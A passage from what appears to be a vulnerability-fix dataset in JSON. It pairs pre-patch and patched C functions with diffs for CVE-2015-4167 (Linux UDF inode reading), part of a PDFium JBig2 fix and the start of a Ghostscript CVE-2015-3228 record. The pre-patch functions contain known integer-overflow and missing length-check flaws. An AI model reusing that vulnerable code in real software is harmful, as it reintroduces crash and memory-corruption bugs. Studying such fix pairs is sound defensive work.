        "func": "void CJBig2_Image::expand(FX_INT32 h, FX_BOOL v)\n{\n    if (!m_pData) {\n        return;\n    }\n    FX_SAFE_DWORD safeMemSize = pdfium::base::checked_cast<FX_DWORD>(h); \n    safeMemSize *= pdfium::base::checked_cast<FX_DWORD>(m_nStride);\n    if (!safeMemSize.IsValid()) {\n        return;\n    }\n    m_pData = (FX_BYTE*)m_pModule->JBig2_Realloc(m_pData, safeMemSize.ValueOrDie());\n    if(h > m_nHeight) {\n        JBIG2_memset(m_pData + m_nHeight * m_nStride, v ? 0xff : 0, (h - m_nHeight)*m_nStride);\n    }\n    m_nHeight = h;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -3,7 +3,12 @@\n     if (!m_pData) {\n         return;\n     }\n-    m_pData = (FX_BYTE*)m_pModule->JBig2_Realloc(m_pData, h * m_nStride);\n+    FX_SAFE_DWORD safeMemSize = pdfium::base::checked_cast<FX_DWORD>(h); \n+    safeMemSize *= pdfium::base::checked_cast<FX_DWORD>(m_nStride);\n+    if (!safeMemSize.IsValid()) {\n+        return;\n+    }\n+    m_pData = (FX_BYTE*)m_pModule->JBig2_Realloc(m_pData, safeMemSize.ValueOrDie());\n     if(h > m_nHeight) {\n         JBIG2_memset(m_pData + m_nHeight * m_nStride, v ? 0xff : 0, (h - m_nHeight)*m_nStride);\n     }",
        "diff_line_info": {
            "deleted_lines": [
                "    m_pData = (FX_BYTE*)m_pModule->JBig2_Realloc(m_pData, h * m_nStride);"
            ],
            "added_lines": [
                "    FX_SAFE_DWORD safeMemSize = pdfium::base::checked_cast<FX_DWORD>(h); ",
                "    safeMemSize *= pdfium::base::checked_cast<FX_DWORD>(m_nStride);",
                "    if (!safeMemSize.IsValid()) {",
                "        return;",
                "    }",
                "    m_pData = (FX_BYTE*)m_pModule->JBig2_Realloc(m_pData, safeMemSize.ValueOrDie());"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4167",
        "func_name": "torvalds/linux/udf_read_inode",
        "description": "The udf_read_inode function in fs/udf/inode.c in the Linux kernel before 3.19.1 does not validate certain length values, which allows local users to cause a denial of service (incorrect data representation or integer overflow, and OOPS) via a crafted UDF filesystem.",
        "git_url": "https://github.com/torvalds/linux/commit/23b133bdc452aa441fcb9b82cbf6dd05cfd342d0",
        "commit_title": "udf: Check length of extended attributes and allocation descriptors",
        "commit_text": " Check length of extended attributes and allocation descriptors when loading inodes from disk. Otherwise corrupted filesystems could confuse the code and make the kernel oops. ",
        "func_before": "static int udf_read_inode(struct inode *inode, bool hidden_inode)\n{\n\tstruct buffer_head *bh = NULL;\n\tstruct fileEntry *fe;\n\tstruct extendedFileEntry *efe;\n\tuint16_t ident;\n\tstruct udf_inode_info *iinfo = UDF_I(inode);\n\tstruct udf_sb_info *sbi = UDF_SB(inode->i_sb);\n\tstruct kernel_lb_addr *iloc = &iinfo->i_location;\n\tunsigned int link_count;\n\tunsigned int indirections = 0;\n\tint bs = inode->i_sb->s_blocksize;\n\tint ret = -EIO;\n\nreread:\n\tif (iloc->logicalBlockNum >=\n\t    sbi->s_partmaps[iloc->partitionReferenceNum].s_partition_len) {\n\t\tudf_debug(\"block=%d, partition=%d out of range\\n\",\n\t\t\t  iloc->logicalBlockNum, iloc->partitionReferenceNum);\n\t\treturn -EIO;\n\t}\n\n\t/*\n\t * Set defaults, but the inode is still incomplete!\n\t * Note: get_new_inode() sets the following on a new inode:\n\t *      i_sb = sb\n\t *      i_no = ino\n\t *      i_flags = sb->s_flags\n\t *      i_state = 0\n\t * clean_inode(): zero fills and sets\n\t *      i_count = 1\n\t *      i_nlink = 1\n\t *      i_op = NULL;\n\t */\n\tbh = udf_read_ptagged(inode->i_sb, iloc, 0, &ident);\n\tif (!bh) {\n\t\tudf_err(inode->i_sb, \"(ino %ld) failed !bh\\n\", inode->i_ino);\n\t\treturn -EIO;\n\t}\n\n\tif (ident != TAG_IDENT_FE && ident != TAG_IDENT_EFE &&\n\t    ident != TAG_IDENT_USE) {\n\t\tudf_err(inode->i_sb, \"(ino %ld) failed ident=%d\\n\",\n\t\t\tinode->i_ino, ident);\n\t\tgoto out;\n\t}\n\n\tfe = (struct fileEntry *)bh->b_data;\n\tefe = (struct extendedFileEntry *)bh->b_data;\n\n\tif (fe->icbTag.strategyType == cpu_to_le16(4096)) {\n\t\tstruct buffer_head *ibh;\n\n\t\tibh = udf_read_ptagged(inode->i_sb, iloc, 1, &ident);\n\t\tif (ident == TAG_IDENT_IE && ibh) {\n\t\t\tstruct kernel_lb_addr loc;\n\t\t\tstruct indirectEntry *ie;\n\n\t\t\tie = (struct indirectEntry *)ibh->b_data;\n\t\t\tloc = lelb_to_cpu(ie->indirectICB.extLocation);\n\n\t\t\tif (ie->indirectICB.extLength) {\n\t\t\t\tbrelse(ibh);\n\t\t\t\tmemcpy(&iinfo->i_location, &loc,\n\t\t\t\t       sizeof(struct kernel_lb_addr));\n\t\t\t\tif (++indirections > UDF_MAX_ICB_NESTING) {\n\t\t\t\t\tudf_err(inode->i_sb,\n\t\t\t\t\t\t\"too many ICBs in ICB hierarchy\"\n\t\t\t\t\t\t\" (max %d supported)\\n\",\n\t\t\t\t\t\tUDF_MAX_ICB_NESTING);\n\t\t\t\t\tgoto out;\n\t\t\t\t}\n\t\t\t\tbrelse(bh);\n\t\t\t\tgoto reread;\n\t\t\t}\n\t\t}\n\t\tbrelse(ibh);\n\t} else if (fe->icbTag.strategyType != cpu_to_le16(4)) {\n\t\tudf_err(inode->i_sb, \"unsupported strategy type: %d\\n\",\n\t\t\tle16_to_cpu(fe->icbTag.strategyType));\n\t\tgoto out;\n\t}\n\tif (fe->icbTag.strategyType == cpu_to_le16(4))\n\t\tiinfo->i_strat4096 = 0;\n\telse /* if (fe->icbTag.strategyType == cpu_to_le16(4096)) */\n\t\tiinfo->i_strat4096 = 1;\n\n\tiinfo->i_alloc_type = le16_to_cpu(fe->icbTag.flags) &\n\t\t\t\t\t\t\tICBTAG_FLAG_AD_MASK;\n\tiinfo->i_unique = 0;\n\tiinfo->i_lenEAttr = 0;\n\tiinfo->i_lenExtents = 0;\n\tiinfo->i_lenAlloc = 0;\n\tiinfo->i_next_alloc_block = 0;\n\tiinfo->i_next_alloc_goal = 0;\n\tif (fe->descTag.tagIdent == cpu_to_le16(TAG_IDENT_EFE)) {\n\t\tiinfo->i_efe = 1;\n\t\tiinfo->i_use = 0;\n\t\tret = udf_alloc_i_data(inode, bs -\n\t\t\t\t\tsizeof(struct extendedFileEntry));\n\t\tif (ret)\n\t\t\tgoto out;\n\t\tmemcpy(iinfo->i_ext.i_data,\n\t\t       bh->b_data + sizeof(struct extendedFileEntry),\n\t\t       bs - sizeof(struct extendedFileEntry));\n\t} else if (fe->descTag.tagIdent == cpu_to_le16(TAG_IDENT_FE)) {\n\t\tiinfo->i_efe = 0;\n\t\tiinfo->i_use = 0;\n\t\tret = udf_alloc_i_data(inode, bs - sizeof(struct fileEntry));\n\t\tif (ret)\n\t\t\tgoto out;\n\t\tmemcpy(iinfo->i_ext.i_data,\n\t\t       bh->b_data + sizeof(struct fileEntry),\n\t\t       bs - sizeof(struct fileEntry));\n\t} else if (fe->descTag.tagIdent == cpu_to_le16(TAG_IDENT_USE)) {\n\t\tiinfo->i_efe = 0;\n\t\tiinfo->i_use = 1;\n\t\tiinfo->i_lenAlloc = le32_to_cpu(\n\t\t\t\t((struct unallocSpaceEntry *)bh->b_data)->\n\t\t\t\t lengthAllocDescs);\n\t\tret = udf_alloc_i_data(inode, bs -\n\t\t\t\t\tsizeof(struct unallocSpaceEntry));\n\t\tif (ret)\n\t\t\tgoto out;\n\t\tmemcpy(iinfo->i_ext.i_data,\n\t\t       bh->b_data + sizeof(struct unallocSpaceEntry),\n\t\t       bs - sizeof(struct unallocSpaceEntry));\n\t\treturn 0;\n\t}\n\n\tret = -EIO;\n\tread_lock(&sbi->s_cred_lock);\n\ti_uid_write(inode, le32_to_cpu(fe->uid));\n\tif (!uid_valid(inode->i_uid) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_UID_IGNORE) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_UID_SET))\n\t\tinode->i_uid = UDF_SB(inode->i_sb)->s_uid;\n\n\ti_gid_write(inode, le32_to_cpu(fe->gid));\n\tif (!gid_valid(inode->i_gid) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_GID_IGNORE) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_GID_SET))\n\t\tinode->i_gid = UDF_SB(inode->i_sb)->s_gid;\n\n\tif (fe->icbTag.fileType != ICBTAG_FILE_TYPE_DIRECTORY &&\n\t\t\tsbi->s_fmode != UDF_INVALID_MODE)\n\t\tinode->i_mode = sbi->s_fmode;\n\telse if (fe->icbTag.fileType == ICBTAG_FILE_TYPE_DIRECTORY &&\n\t\t\tsbi->s_dmode != UDF_INVALID_MODE)\n\t\tinode->i_mode = sbi->s_dmode;\n\telse\n\t\tinode->i_mode = udf_convert_permissions(fe);\n\tinode->i_mode &= ~sbi->s_umask;\n\tread_unlock(&sbi->s_cred_lock);\n\n\tlink_count = le16_to_cpu(fe->fileLinkCount);\n\tif (!link_count) {\n\t\tif (!hidden_inode) {\n\t\t\tret = -ESTALE;\n\t\t\tgoto out;\n\t\t}\n\t\tlink_count = 1;\n\t}\n\tset_nlink(inode, link_count);\n\n\tinode->i_size = le64_to_cpu(fe->informationLength);\n\tiinfo->i_lenExtents = inode->i_size;\n\n\tif (iinfo->i_efe == 0) {\n\t\tinode->i_blocks = le64_to_cpu(fe->logicalBlocksRecorded) <<\n\t\t\t(inode->i_sb->s_blocksize_bits - 9);\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_atime, fe->accessTime))\n\t\t\tinode->i_atime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_mtime,\n\t\t\t\t\t    fe->modificationTime))\n\t\t\tinode->i_mtime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_ctime, fe->attrTime))\n\t\t\tinode->i_ctime = sbi->s_record_time;\n\n\t\tiinfo->i_unique = le64_to_cpu(fe->uniqueID);\n\t\tiinfo->i_lenEAttr = le32_to_cpu(fe->lengthExtendedAttr);\n\t\tiinfo->i_lenAlloc = le32_to_cpu(fe->lengthAllocDescs);\n\t\tiinfo->i_checkpoint = le32_to_cpu(fe->checkpoint);\n\t} else {\n\t\tinode->i_blocks = le64_to_cpu(efe->logicalBlocksRecorded) <<\n\t\t    (inode->i_sb->s_blocksize_bits - 9);\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_atime, efe->accessTime))\n\t\t\tinode->i_atime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_mtime,\n\t\t\t\t\t    efe->modificationTime))\n\t\t\tinode->i_mtime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&iinfo->i_crtime, efe->createTime))\n\t\t\tiinfo->i_crtime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_ctime, efe->attrTime))\n\t\t\tinode->i_ctime = sbi->s_record_time;\n\n\t\tiinfo->i_unique = le64_to_cpu(efe->uniqueID);\n\t\tiinfo->i_lenEAttr = le32_to_cpu(efe->lengthExtendedAttr);\n\t\tiinfo->i_lenAlloc = le32_to_cpu(efe->lengthAllocDescs);\n\t\tiinfo->i_checkpoint = le32_to_cpu(efe->checkpoint);\n\t}\n\tinode->i_generation = iinfo->i_unique;\n\n\t/* Sanity checks for files in ICB so that we don't get confused later */\n\tif (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB) {\n\t\t/*\n\t\t * For file in ICB data is stored in allocation descriptor\n\t\t * so sizes should match\n\t\t */\n\t\tif (iinfo->i_lenAlloc != inode->i_size)\n\t\t\tgoto out;\n\t\t/* File in ICB has to fit in there... */\n\t\tif (inode->i_size > bs - udf_file_entry_alloc_offset(inode))\n\t\t\tgoto out;\n\t}\n\n\tswitch (fe->icbTag.fileType) {\n\tcase ICBTAG_FILE_TYPE_DIRECTORY:\n\t\tinode->i_op = &udf_dir_inode_operations;\n\t\tinode->i_fop = &udf_dir_operations;\n\t\tinode->i_mode |= S_IFDIR;\n\t\tinc_nlink(inode);\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_REALTIME:\n\tcase ICBTAG_FILE_TYPE_REGULAR:\n\tcase ICBTAG_FILE_TYPE_UNDEF:\n\tcase ICBTAG_FILE_TYPE_VAT20:\n\t\tif (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB)\n\t\t\tinode->i_data.a_ops = &udf_adinicb_aops;\n\t\telse\n\t\t\tinode->i_data.a_ops = &udf_aops;\n\t\tinode->i_op = &udf_file_inode_operations;\n\t\tinode->i_fop = &udf_file_operations;\n\t\tinode->i_mode |= S_IFREG;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_BLOCK:\n\t\tinode->i_mode |= S_IFBLK;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_CHAR:\n\t\tinode->i_mode |= S_IFCHR;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_FIFO:\n\t\tinit_special_inode(inode, inode->i_mode | S_IFIFO, 0);\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_SOCKET:\n\t\tinit_special_inode(inode, inode->i_mode | S_IFSOCK, 0);\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_SYMLINK:\n\t\tinode->i_data.a_ops = &udf_symlink_aops;\n\t\tinode->i_op = &udf_symlink_inode_operations;\n\t\tinode->i_mode = S_IFLNK | S_IRWXUGO;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_MAIN:\n\t\tudf_debug(\"METADATA FILE-----\\n\");\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_MIRROR:\n\t\tudf_debug(\"METADATA MIRROR FILE-----\\n\");\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_BITMAP:\n\t\tudf_debug(\"METADATA BITMAP FILE-----\\n\");\n\t\tbreak;\n\tdefault:\n\t\tudf_err(inode->i_sb, \"(ino %ld) failed unknown file type=%d\\n\",\n\t\t\tinode->i_ino, fe->icbTag.fileType);\n\t\tgoto out;\n\t}\n\tif (S_ISCHR(inode->i_mode) || S_ISBLK(inode->i_mode)) {\n\t\tstruct deviceSpec *dsea =\n\t\t\t(struct deviceSpec *)udf_get_extendedattr(inode, 12, 1);\n\t\tif (dsea) {\n\t\t\tinit_special_inode(inode, inode->i_mode,\n\t\t\t\tMKDEV(le32_to_cpu(dsea->majorDeviceIdent),\n\t\t\t\t      le32_to_cpu(dsea->minorDeviceIdent)));\n\t\t\t/* Developer ID ??? */\n\t\t} else\n\t\t\tgoto out;\n\t}\n\tret = 0;\nout:\n\tbrelse(bh);\n\treturn ret;\n}",
        "func": "static int udf_read_inode(struct inode *inode, bool hidden_inode)\n{\n\tstruct buffer_head *bh = NULL;\n\tstruct fileEntry *fe;\n\tstruct extendedFileEntry *efe;\n\tuint16_t ident;\n\tstruct udf_inode_info *iinfo = UDF_I(inode);\n\tstruct udf_sb_info *sbi = UDF_SB(inode->i_sb);\n\tstruct kernel_lb_addr *iloc = &iinfo->i_location;\n\tunsigned int link_count;\n\tunsigned int indirections = 0;\n\tint bs = inode->i_sb->s_blocksize;\n\tint ret = -EIO;\n\nreread:\n\tif (iloc->logicalBlockNum >=\n\t    sbi->s_partmaps[iloc->partitionReferenceNum].s_partition_len) {\n\t\tudf_debug(\"block=%d, partition=%d out of range\\n\",\n\t\t\t  iloc->logicalBlockNum, iloc->partitionReferenceNum);\n\t\treturn -EIO;\n\t}\n\n\t/*\n\t * Set defaults, but the inode is still incomplete!\n\t * Note: get_new_inode() sets the following on a new inode:\n\t *      i_sb = sb\n\t *      i_no = ino\n\t *      i_flags = sb->s_flags\n\t *      i_state = 0\n\t * clean_inode(): zero fills and sets\n\t *      i_count = 1\n\t *      i_nlink = 1\n\t *      i_op = NULL;\n\t */\n\tbh = udf_read_ptagged(inode->i_sb, iloc, 0, &ident);\n\tif (!bh) {\n\t\tudf_err(inode->i_sb, \"(ino %ld) failed !bh\\n\", inode->i_ino);\n\t\treturn -EIO;\n\t}\n\n\tif (ident != TAG_IDENT_FE && ident != TAG_IDENT_EFE &&\n\t    ident != TAG_IDENT_USE) {\n\t\tudf_err(inode->i_sb, \"(ino %ld) failed ident=%d\\n\",\n\t\t\tinode->i_ino, ident);\n\t\tgoto out;\n\t}\n\n\tfe = (struct fileEntry *)bh->b_data;\n\tefe = (struct extendedFileEntry *)bh->b_data;\n\n\tif (fe->icbTag.strategyType == cpu_to_le16(4096)) {\n\t\tstruct buffer_head *ibh;\n\n\t\tibh = udf_read_ptagged(inode->i_sb, iloc, 1, &ident);\n\t\tif (ident == TAG_IDENT_IE && ibh) {\n\t\t\tstruct kernel_lb_addr loc;\n\t\t\tstruct indirectEntry *ie;\n\n\t\t\tie = (struct indirectEntry *)ibh->b_data;\n\t\t\tloc = lelb_to_cpu(ie->indirectICB.extLocation);\n\n\t\t\tif (ie->indirectICB.extLength) {\n\t\t\t\tbrelse(ibh);\n\t\t\t\tmemcpy(&iinfo->i_location, &loc,\n\t\t\t\t       sizeof(struct kernel_lb_addr));\n\t\t\t\tif (++indirections > UDF_MAX_ICB_NESTING) {\n\t\t\t\t\tudf_err(inode->i_sb,\n\t\t\t\t\t\t\"too many ICBs in ICB hierarchy\"\n\t\t\t\t\t\t\" (max %d supported)\\n\",\n\t\t\t\t\t\tUDF_MAX_ICB_NESTING);\n\t\t\t\t\tgoto out;\n\t\t\t\t}\n\t\t\t\tbrelse(bh);\n\t\t\t\tgoto reread;\n\t\t\t}\n\t\t}\n\t\tbrelse(ibh);\n\t} else if (fe->icbTag.strategyType != cpu_to_le16(4)) {\n\t\tudf_err(inode->i_sb, \"unsupported strategy type: %d\\n\",\n\t\t\tle16_to_cpu(fe->icbTag.strategyType));\n\t\tgoto out;\n\t}\n\tif (fe->icbTag.strategyType == cpu_to_le16(4))\n\t\tiinfo->i_strat4096 = 0;\n\telse /* if (fe->icbTag.strategyType == cpu_to_le16(4096)) */\n\t\tiinfo->i_strat4096 = 1;\n\n\tiinfo->i_alloc_type = le16_to_cpu(fe->icbTag.flags) &\n\t\t\t\t\t\t\tICBTAG_FLAG_AD_MASK;\n\tiinfo->i_unique = 0;\n\tiinfo->i_lenEAttr = 0;\n\tiinfo->i_lenExtents = 0;\n\tiinfo->i_lenAlloc = 0;\n\tiinfo->i_next_alloc_block = 0;\n\tiinfo->i_next_alloc_goal = 0;\n\tif (fe->descTag.tagIdent == cpu_to_le16(TAG_IDENT_EFE)) {\n\t\tiinfo->i_efe = 1;\n\t\tiinfo->i_use = 0;\n\t\tret = udf_alloc_i_data(inode, bs -\n\t\t\t\t\tsizeof(struct extendedFileEntry));\n\t\tif (ret)\n\t\t\tgoto out;\n\t\tmemcpy(iinfo->i_ext.i_data,\n\t\t       bh->b_data + sizeof(struct extendedFileEntry),\n\t\t       bs - sizeof(struct extendedFileEntry));\n\t} else if (fe->descTag.tagIdent == cpu_to_le16(TAG_IDENT_FE)) {\n\t\tiinfo->i_efe = 0;\n\t\tiinfo->i_use = 0;\n\t\tret = udf_alloc_i_data(inode, bs - sizeof(struct fileEntry));\n\t\tif (ret)\n\t\t\tgoto out;\n\t\tmemcpy(iinfo->i_ext.i_data,\n\t\t       bh->b_data + sizeof(struct fileEntry),\n\t\t       bs - sizeof(struct fileEntry));\n\t} else if (fe->descTag.tagIdent == cpu_to_le16(TAG_IDENT_USE)) {\n\t\tiinfo->i_efe = 0;\n\t\tiinfo->i_use = 1;\n\t\tiinfo->i_lenAlloc = le32_to_cpu(\n\t\t\t\t((struct unallocSpaceEntry *)bh->b_data)->\n\t\t\t\t lengthAllocDescs);\n\t\tret = udf_alloc_i_data(inode, bs -\n\t\t\t\t\tsizeof(struct unallocSpaceEntry));\n\t\tif (ret)\n\t\t\tgoto out;\n\t\tmemcpy(iinfo->i_ext.i_data,\n\t\t       bh->b_data + sizeof(struct unallocSpaceEntry),\n\t\t       bs - sizeof(struct unallocSpaceEntry));\n\t\treturn 0;\n\t}\n\n\tret = -EIO;\n\tread_lock(&sbi->s_cred_lock);\n\ti_uid_write(inode, le32_to_cpu(fe->uid));\n\tif (!uid_valid(inode->i_uid) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_UID_IGNORE) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_UID_SET))\n\t\tinode->i_uid = UDF_SB(inode->i_sb)->s_uid;\n\n\ti_gid_write(inode, le32_to_cpu(fe->gid));\n\tif (!gid_valid(inode->i_gid) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_GID_IGNORE) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_GID_SET))\n\t\tinode->i_gid = UDF_SB(inode->i_sb)->s_gid;\n\n\tif (fe->icbTag.fileType != ICBTAG_FILE_TYPE_DIRECTORY &&\n\t\t\tsbi->s_fmode != UDF_INVALID_MODE)\n\t\tinode->i_mode = sbi->s_fmode;\n\telse if (fe->icbTag.fileType == ICBTAG_FILE_TYPE_DIRECTORY &&\n\t\t\tsbi->s_dmode != UDF_INVALID_MODE)\n\t\tinode->i_mode = sbi->s_dmode;\n\telse\n\t\tinode->i_mode = udf_convert_permissions(fe);\n\tinode->i_mode &= ~sbi->s_umask;\n\tread_unlock(&sbi->s_cred_lock);\n\n\tlink_count = le16_to_cpu(fe->fileLinkCount);\n\tif (!link_count) {\n\t\tif (!hidden_inode) {\n\t\t\tret = -ESTALE;\n\t\t\tgoto out;\n\t\t}\n\t\tlink_count = 1;\n\t}\n\tset_nlink(inode, link_count);\n\n\tinode->i_size = le64_to_cpu(fe->informationLength);\n\tiinfo->i_lenExtents = inode->i_size;\n\n\tif (iinfo->i_efe == 0) {\n\t\tinode->i_blocks = le64_to_cpu(fe->logicalBlocksRecorded) <<\n\t\t\t(inode->i_sb->s_blocksize_bits - 9);\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_atime, fe->accessTime))\n\t\t\tinode->i_atime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_mtime,\n\t\t\t\t\t    fe->modificationTime))\n\t\t\tinode->i_mtime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_ctime, fe->attrTime))\n\t\t\tinode->i_ctime = sbi->s_record_time;\n\n\t\tiinfo->i_unique = le64_to_cpu(fe->uniqueID);\n\t\tiinfo->i_lenEAttr = le32_to_cpu(fe->lengthExtendedAttr);\n\t\tiinfo->i_lenAlloc = le32_to_cpu(fe->lengthAllocDescs);\n\t\tiinfo->i_checkpoint = le32_to_cpu(fe->checkpoint);\n\t} else {\n\t\tinode->i_blocks = le64_to_cpu(efe->logicalBlocksRecorded) <<\n\t\t    (inode->i_sb->s_blocksize_bits - 9);\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_atime, efe->accessTime))\n\t\t\tinode->i_atime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_mtime,\n\t\t\t\t\t    efe->modificationTime))\n\t\t\tinode->i_mtime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&iinfo->i_crtime, efe->createTime))\n\t\t\tiinfo->i_crtime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_ctime, efe->attrTime))\n\t\t\tinode->i_ctime = sbi->s_record_time;\n\n\t\tiinfo->i_unique = le64_to_cpu(efe->uniqueID);\n\t\tiinfo->i_lenEAttr = le32_to_cpu(efe->lengthExtendedAttr);\n\t\tiinfo->i_lenAlloc = le32_to_cpu(efe->lengthAllocDescs);\n\t\tiinfo->i_checkpoint = le32_to_cpu(efe->checkpoint);\n\t}\n\tinode->i_generation = iinfo->i_unique;\n\n\t/*\n\t * Sanity check length of allocation descriptors and extended attrs to\n\t * avoid integer overflows\n\t */\n\tif (iinfo->i_lenEAttr > bs || iinfo->i_lenAlloc > bs)\n\t\tgoto out;\n\t/* Now do exact checks */\n\tif (udf_file_entry_alloc_offset(inode) + iinfo->i_lenAlloc > bs)\n\t\tgoto out;\n\t/* Sanity checks for files in ICB so that we don't get confused later */\n\tif (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB) {\n\t\t/*\n\t\t * For file in ICB data is stored in allocation descriptor\n\t\t * so sizes should match\n\t\t */\n\t\tif (iinfo->i_lenAlloc != inode->i_size)\n\t\t\tgoto out;\n\t\t/* File in ICB has to fit in there... */\n\t\tif (inode->i_size > bs - udf_file_entry_alloc_offset(inode))\n\t\t\tgoto out;\n\t}\n\n\tswitch (fe->icbTag.fileType) {\n\tcase ICBTAG_FILE_TYPE_DIRECTORY:\n\t\tinode->i_op = &udf_dir_inode_operations;\n\t\tinode->i_fop = &udf_dir_operations;\n\t\tinode->i_mode |= S_IFDIR;\n\t\tinc_nlink(inode);\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_REALTIME:\n\tcase ICBTAG_FILE_TYPE_REGULAR:\n\tcase ICBTAG_FILE_TYPE_UNDEF:\n\tcase ICBTAG_FILE_TYPE_VAT20:\n\t\tif (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB)\n\t\t\tinode->i_data.a_ops = &udf_adinicb_aops;\n\t\telse\n\t\t\tinode->i_data.a_ops = &udf_aops;\n\t\tinode->i_op = &udf_file_inode_operations;\n\t\tinode->i_fop = &udf_file_operations;\n\t\tinode->i_mode |= S_IFREG;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_BLOCK:\n\t\tinode->i_mode |= S_IFBLK;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_CHAR:\n\t\tinode->i_mode |= S_IFCHR;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_FIFO:\n\t\tinit_special_inode(inode, inode->i_mode | S_IFIFO, 0);\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_SOCKET:\n\t\tinit_special_inode(inode, inode->i_mode | S_IFSOCK, 0);\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_SYMLINK:\n\t\tinode->i_data.a_ops = &udf_symlink_aops;\n\t\tinode->i_op = &udf_symlink_inode_operations;\n\t\tinode->i_mode = S_IFLNK | S_IRWXUGO;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_MAIN:\n\t\tudf_debug(\"METADATA FILE-----\\n\");\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_MIRROR:\n\t\tudf_debug(\"METADATA MIRROR FILE-----\\n\");\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_BITMAP:\n\t\tudf_debug(\"METADATA BITMAP FILE-----\\n\");\n\t\tbreak;\n\tdefault:\n\t\tudf_err(inode->i_sb, \"(ino %ld) failed unknown file type=%d\\n\",\n\t\t\tinode->i_ino, fe->icbTag.fileType);\n\t\tgoto out;\n\t}\n\tif (S_ISCHR(inode->i_mode) || S_ISBLK(inode->i_mode)) {\n\t\tstruct deviceSpec *dsea =\n\t\t\t(struct deviceSpec *)udf_get_extendedattr(inode, 12, 1);\n\t\tif (dsea) {\n\t\t\tinit_special_inode(inode, inode->i_mode,\n\t\t\t\tMKDEV(le32_to_cpu(dsea->majorDeviceIdent),\n\t\t\t\t      le32_to_cpu(dsea->minorDeviceIdent)));\n\t\t\t/* Developer ID ??? */\n\t\t} else\n\t\t\tgoto out;\n\t}\n\tret = 0;\nout:\n\tbrelse(bh);\n\treturn ret;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -208,6 +208,15 @@\n \t}\n \tinode->i_generation = iinfo->i_unique;\n \n+\t/*\n+\t * Sanity check length of allocation descriptors and extended attrs to\n+\t * avoid integer overflows\n+\t */\n+\tif (iinfo->i_lenEAttr > bs || iinfo->i_lenAlloc > bs)\n+\t\tgoto out;\n+\t/* Now do exact checks */\n+\tif (udf_file_entry_alloc_offset(inode) + iinfo->i_lenAlloc > bs)\n+\t\tgoto out;\n \t/* Sanity checks for files in ICB so that we don't get confused later */\n \tif (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB) {\n \t\t/*",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\t/*",
                "\t * Sanity check length of allocation descriptors and extended attrs to",
                "\t * avoid integer overflows",
                "\t */",
                "\tif (iinfo->i_lenEAttr > bs || iinfo->i_lenAlloc > bs)",
                "\t\tgoto out;",
                "\t/* Now do exact checks */",
                "\tif (udf_file_entry_alloc_offset(inode) + iinfo->i_lenAlloc > bs)",
                "\t\tgoto out;"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-3228",
        "func_name": "ArtifexSoftware/ghostpdl/gs_heap_alloc_bytes",
        "description": "Integer overflow in the gs_heap_alloc_bytes function in base/gsmalloc.c in Ghostscript 9.15 and earlier allows remote attackers to cause a denial of service (crash) via a crafted Postscript (ps) file, as demonstrated by using the ps2pdf command, which triggers an out-of-bounds read or write.",
        "git_url": "https://github.com/ArtifexSoftware/ghostpdl/commit/0c0b0859ae1aba64861599f0e7f74f143f305932",
        "commit_title": "Bug 696041: sanity check for memory allocation.",
        "commit_text": " In gs_heap_alloc_bytes(), add a sanity check to ensure we don't overflow the variable holding the actual number of bytes we allocate.  No cluster differences",
